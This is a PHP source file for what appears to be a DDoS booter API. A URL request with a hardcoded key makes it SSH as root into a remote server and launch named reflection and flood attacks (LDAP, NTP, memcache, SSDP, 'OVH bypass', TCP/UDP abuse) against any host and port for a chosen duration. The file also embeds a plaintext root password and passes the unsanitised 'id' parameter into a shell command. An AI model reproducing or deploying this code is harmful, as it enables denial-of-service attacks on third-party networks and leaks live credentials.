<?php
if (!function_exists('ssh2_connect')){
        die("Install ssh2 module.\n");
}
if ($_GET['key'] != "n3tbl0ck"){
        die("Go Away.");
}
if (isset($_GET['host'], $_GET['port'], $_GET['time'], $_GET['method'])) {
        class ssh2 {
                var $connection;
                function __construct($host, $user, $pass) {
                        if (!$this->connection = ssh2_connect($host, 22))
                                throw new Exception(die("Error connecting to server"));
                        if (!ssh2_auth_password($this->connection, $user, $pass))
                                throw new Exception(die("Error with login credentials"));
                }
 
                function exec($cmd) {
                        if (!ssh2_exec($this->connection, $cmd))
                                throw new Exception(die("Error executing command: $cmd"));
 
                        ssh2_exec($this->connection, 'exit');
                        unset($this->connection);
                }
        }
        $port = (int)$_GET['port'] > 0 && (int)$_GET['port'] < 65536 ? $_GET['port'] : 80;
        $port = preg_replace('/\D/', '', $port);
        $ip = preg_match('/^[a-zA-Z0-9\.-_]+$/', $_GET['host']) ? $_GET['host'] : die();
        $time = (int)$_GET['time'] > 0 && (int)$_GET['time'] < (60*308) ? (int)$_GET['time'] : 30;
        $time = preg_replace('/\D/', '', $time);
 	      $threads = (int)$_GET['threads'] > 0 && (int)$_GET['threads'] < 2048 ? $_GET['threads'] : 100;
	      $threads = preg_replace('/\D/', '', $threads);
	      $method = $_GET['method'];
        $domain = $_GET['host'];
        if(!filter_var($domain, FILTER_VALIDATE_URL) && !filter_var($domain, FILTER_VALIDATE_IP)) {
            die("Invalid Domain");
        }
        $id = $_GET['id'];
        $smDomain = str_replace(".", "", $domain);
        $smDomain = str_replace("http://", "", $smDomain);
        if($_GET['method'] == "LDAP") { $command = "cd /root/entity && screen -dmS Id{$id} ./ldap {$ip} {$port} ldap_filtered.txt {$threads} -1 {$time}"; }
        elseif($_GET['method'] == "SSDP") { $command = "cd /root/entity && screen -dmS Id{$id} ./ssdp {$ip} {$port} ssdp.txt {$threads} -1 {$time}"; }
		elseif($_GET['method'] == "WSD") { $command = "cd /root/entity && screen -dmS Id{$id} ./wsd {$ip} {$port} wsd.txt {$threads} -1 {$time}"; }
        elseif($_GET['method'] == "NTP") { $command = "cd /root/entity && screen -dmS Id{$id} ./ntp {$ip} {$port} ntp.txt {$threads} -1 {$time}"; }
        elseif($_GET['method'] == "VSE") { $command = "cd /root/entity && screen -dmS Id{$id} ./vse {$ip} {$threads} -1 {$time}"; }
	    elseif($_GET['method'] == "CHARGEN") { $command = "screen -dmS Id{$id} ./chargen {$ip} {$port} chargen.txt {$threads} -1 {$time}"; }
		elseif($_GET['method'] == "BO4") { $command = "cd /root/entity && screen -dmS Id{$id} ./bo4bypass {$ip} {$port} -1 {$time}"; }
		elseif($_GET['method'] == "HEARTBEAT") { $command = "cd /root/entity && screen -dmS Id{$id} ./heartbeat {$ip} {$port} heartbeat.txt {$threads} -1 {$time}"; }
		elseif($_GET['method'] == "HUN") { $command = "cd /root/entity && screen -dmS Id{$id} ./hun-fun {$ip} {$port} hun.txt {$threads} -1 {$time}"; }
		elseif($_GET['method'] == "MEMCACHE") { $command = "cd /root/entity && screen -dmS Id{$id} ./memcache {$ip} {$port} memcache.txt {$threads} -1 {$time}"; }
		elseif($_GET['method'] == "OVH") { $command = "cd /root/entity && screen -dmS Id{$id} ./ovhbypass {$ip} {$port} {$time} 0"; }
		elseif($_GET['method'] == "OVH-2") { $command = "cd /root/entity && screen -dmS Id{$id} ./pmp-pmp {$ip} {$port} pmp.txt -1 {$time}"; }
		elseif($_GET['method'] == "TCP-ABUSE") { $command = "cd /root/entity && screen -dmS Id{$id} ./tcp_abuse {$ip} {$port} {$threads} -1 {$time}"; }
		elseif($_GET['method'] == "UDP-ABUSE") { $command = "cd /root/entity && screen -dmS Id{$id} ./udp_abuse {$ip} {$port} {$threads} -1 {$time}"; }
		elseif($_GET['method'] == "VSE-2") { $command = "cd /root/entity && screen -dmS Id{$id} ./UDP_VSE2 {$ip} {$port} -1 {$threads} {$time}"; }
        elseif($_GET['method'] == "STOP") { $command = "screen -X -S Id{$id} quit"; }
        else die("error");
        
    	$pretty = "Sending To {$ip}:{$port} using {$method} with {$threads} threads for {$time} seconds. | API Made By Netblocks.";
        $disposable = new ssh2("185.244.25.189", "root", "illiteracyisthenextdegeneracy");
        $disposable->exec($command);
        die($pretty);
}
// IP/API.php/?key=YOURFUCKINGKEY&host=[host]&port=[port]&method=[method]&time=[time]
//exp: 1.1.1.1/x.php?key=YOURFUCKINGKEY&host=8.8.8.8&port=80&method=udp&time=100
?>
